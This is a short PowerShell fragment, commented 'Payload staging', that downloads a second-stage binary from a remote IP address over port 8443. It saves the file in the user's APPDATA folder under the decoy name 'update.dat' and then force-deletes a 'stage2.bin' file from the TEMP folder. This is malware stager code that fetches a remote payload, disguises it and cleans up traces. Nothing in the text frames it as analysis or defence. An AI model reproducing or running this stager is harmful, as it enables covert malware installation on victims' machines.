
<# Payload staging #> $Stage2Url = "https://192.0.2.214:8443/cdn/stage2.bin"; $Stage2Path = "$env:APPDATA\update.dat"; Start-BitsTransfer -Source $Stage2Url -Destination $Stage2Path; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
